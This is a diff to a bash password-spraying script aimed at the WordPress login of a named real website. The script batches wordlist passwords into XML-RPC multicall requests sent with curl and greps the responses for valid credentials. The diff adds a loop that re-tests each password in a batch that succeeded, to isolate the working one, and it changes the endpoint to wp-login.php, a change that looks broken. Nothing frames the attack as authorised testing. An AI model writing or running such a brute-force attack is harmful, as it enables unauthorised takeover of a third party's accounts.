@@ -9,6 +9,7 @@ BATCH=""
 TOTAL=0
 BATCH_NUM=0
 SUCCESS=0
+LAST_BATCH=""
 
 # Count total passwords first for progress
 TOTAL_PASS=$(wc -l < "$WORDLIST")
@@ -30,6 +31,8 @@ while IFS= read -r PASS; do
       <value><string>${PASS_ESCAPED}</string></value>
     </data></array></value></member>
   </struct></value>"
+  
+  LAST_BATCH+="${PASS}\n"
   
   COUNTER=$((COUNTER + 1))
   
@@ -56,7 +59,7 @@ while IFS= read -r PASS; do
     
     echo "$XML" > /tmp/spray_batch.xml
     
-    RESPONSE=$(curl -s -X POST https://churchofsatan.com/xmlrpc.php \
+    RESPONSE=$(curl -s -X POST https://churchofsatan.com/wp-login.php \
       -H "Content-Type: text/xml" \
       -d @/tmp/spray_batch.xml 2>&1)
     
@@ -66,6 +69,35 @@ while IFS= read -r PASS; do
       echo "[+] ==============================================="
       echo "[+] SUCCESS! Valid credentials found in batch $BATCH_NUM"
       echo "$RESPONSE" | grep -oP '<string>[^<]+</string>' | head -5
+      echo "[+] Re-testing each password in the batch..."
+      
+      # Re-test each password in the batch
+      while IFS= read -r PASSWORD; do
+        XML="<?xml version=\"1.0\"?>
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+    <param>
+      <value><string>${USER}</string></value>
+    </param>
+    <param>
+      <value><string>${PASSWORD}</string></value>
+    </param>
+  </params>
+</methodCall>"
+        
+        echo "$XML" > /tmp/spray_single.xml
+        
+        RESPONSE=$(curl -s -X POST https://churchofsatan.com/wp-login.php \
+          -H "Content-Type: text/xml" \
+          -d @/tmp/spray_single.xml 2>&1)
+        
+        if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
+          echo "[+] Found password: $PASSWORD"
+          break
+        fi
+      done <<< "$LAST_BATCH"
+      
       echo "[+] ==============================================="
       echo ""
       SUCCESS=1
@@ -85,6 +117,7 @@ while IFS= read -r PASS; do
     
     # Reset
     BATCH=""
+    LAST_BATCH=""
     COUNTER=0
   fi
 done < "$WORDLIST"
@@ -113,7 +146,7 @@ if [ $COUNTER -gt 0 ] && [ $SUCCESS -eq 0 ]; then
   
   echo "$XML" > /tmp/spray_batch.xml
   
-  RESPONSE=$(curl -s -X POST https://churchofsatan.com/xmlrpc.php \
+  RESPONSE=$(curl -s -X POST https://churchofsatan.com/wp-login.php \
     -H "Content-Type: text/xml" \
     -d @/tmp/spray_batch.xml 2>&1)
   
@@ -122,6 +155,35 @@ if [ $COUNTER -gt 0 ] && [ $SUCCESS -eq 0 ]; then
     echo "[+] ==============================================="
     echo "[+] SUCCESS! Valid credentials found in final batch"
     echo "$RESPONSE" | grep -oP '<string>[^<]+</string>' | head -5
+    echo "[+] Re-testing each password in the batch..."
+    
+    # Re-test each password in the batch
+    while IFS= read -r PASSWORD; do
+      XML="<?xml version=\"1.0\"?>
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+    <param>
+      <value><string>${USER}</string></value>
+    </param>
+    <param>
+      <value><string>${PASSWORD}</string></value>
+    </param>
+  </params>
+</methodCall>"
+      
+      echo "$XML" > /tmp/spray_single.xml
+      
+      RESPONSE=$(curl -s -X POST https://churchofsatan.com/wp-login.php \
+        -H "Content-Type: text/xml" \
+        -d @/tmp/spray_single.xml 2>&1)
+      
+      if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
+        echo "[+] Found password: $PASSWORD"
+        break
+      fi
+    done <<< "$LAST_BATCH"
+    
     echo "[+] ==============================================="
   fi
 fi
